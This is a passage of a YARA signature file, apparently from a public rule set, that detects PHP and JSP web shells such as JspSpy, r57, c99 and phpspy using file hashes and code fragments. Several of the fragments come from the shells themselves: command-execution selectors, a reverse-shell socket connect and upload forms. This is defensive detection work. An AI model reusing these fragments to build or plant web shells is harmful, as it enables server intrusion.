		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash1 = "e0354099bee243702eb11df8d0e046df"
		hash2 = "591ca89a25f06cf01e4345f98a22845c"
	strings:
		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
	condition:
		all of them
}
rule webshell_browser_201_3_ma_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
		$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
	condition:
		all of them
}
rule webshell_itsec_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash2 = "40c6ecf77253e805ace85f119fe1cebb"
	strings:
		$s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
		$s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
	condition:
		all of them
}
rule webshell_ghost_source_icesword_silic {
	meta:
		description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
		hash1 = "6e20b41c040efb453d57780025a292ae"
		hash2 = "437d30c94f8eef92dc2f064de4998695"
	strings:
		$s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
		$s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
	condition:
		all of them
}
rule webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash6 = "14e9688c86b454ed48171a9d4f48ace8"
		hash7 = "b330a6c2d49124ef0729539761d6ef0b"
		hash8 = "d71716df5042880ef84427acee8b121e"
		hash9 = "341298482cf90febebb8616426080d1d"
		hash10 = "29aebe333d6332f0ebc2258def94d57e"
		hash11 = "42654af68e5d4ea217e6ece5389eb302"
		hash12 = "88fc87e7c58249a398efd5ceae636073"
		hash13 = "4a812678308475c64132a9b56254edbc"
		hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash15 = "344f9073576a066142b2023629539ebd"
		hash16 = "32dea47d9c13f9000c4c807561341bee"
		hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash18 = "655722eaa6c646437c8ae93daac46ae0"
		hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash20 = "9c94637f76e68487fa33f7b0030dd932"
		hash21 = "6acc82544be056580c3a1caaa4999956"
		hash22 = "6aa32a6392840e161a018f3907a86968"
		hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash24 = "3ea688e3439a1f56b16694667938316d"
		hash25 = "ab77e4d1006259d7cbc15884416ca88c"
		hash26 = "71097537a91fac6b01f46f66ee2d7749"
		hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash28 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
		$s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
	condition:
		all of them
}
rule webshell_2_520_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
	condition:
		all of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "9c94637f76e68487fa33f7b0030dd932"
		hash23 = "6acc82544be056580c3a1caaa4999956"
		hash24 = "6aa32a6392840e161a018f3907a86968"
		hash25 = "591ca89a25f06cf01e4345f98a22845c"
		hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash27 = "3ea688e3439a1f56b16694667938316d"
		hash28 = "ab77e4d1006259d7cbc15884416ca88c"
		hash29 = "71097537a91fac6b01f46f66ee2d7749"
		hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash31 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
		$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
	condition:
		all of them
}
rule webshell_wso2_5_1_wso2_5_wso2 {
	meta:
		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
		hash2 = "cbc44fb78220958f81b739b493024688"
	strings:
		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
	condition:
		all of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		hash5 = "9c94637f76e68487fa33f7b0030dd932"
	strings:
		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
	condition:
		all of them
}
rule webshell_404_data_suiyue {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
	strings:
		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
	condition:
		all of them
}
rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
	meta:
		description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
	condition:
		all of them
}
rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
	meta:
		description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
	condition:
		all of them
}
rule webshell_201_3_ma_download {
	meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
	condition:
		all of them
}
rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
	condition:
		all of them
}
rule webshell_shell_phpspy_2006_arabicspy {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
	condition:
		all of them
}
rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
	meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
	condition:
		all of them
}
rule webshell_2_520_icesword_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
		$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
		$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
	condition:
		all of them
}
rule webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
		$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
		$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
	condition:
		2 of them
}
rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
	condition:
		all of them
}
rule webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files c99.php, Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "f2fa878de03732fbf5c86d656467ff50"
		hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash5 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
	condition:
		all of them
}
rule webshell_2008_2009lite_2009mssql {
	meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
	condition:
		all of them
}
rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
	condition:
		all of them
}
rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
	meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
	condition:
		1 of them
}
rule webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
	meta:
		description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
		hash1 = "f8a6d5306fb37414c5c772315a27832f"
		hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
	strings:
		$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
		$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
	condition:
		all of them
}
rule webshell_404_data_in_JFolder_jfolder01_xxx {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
	condition:
		all of them
}
rule webshell_jsp_reverse_jsp_reverse_jspbd {
	meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
		score = 50
	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
	condition:
		all of them
}
rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
	meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"
	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
	condition:
		2 of them
}
rule webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
		$s6 = "password = (String)session.getAttribute(\"password\");" fullword
		$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
	condition:
		2 of them
}
rule webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 60
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash4 = "40a1f840111996ff7200d18968e42cfe"
		hash5 = "e0202adff532b28ef1ba206cf95962f2"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
		$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
		$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
		$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
		$fn = "filename: backup"
	condition:
		2 of ($s*) and not $fn
}
rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
	meta:
		description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
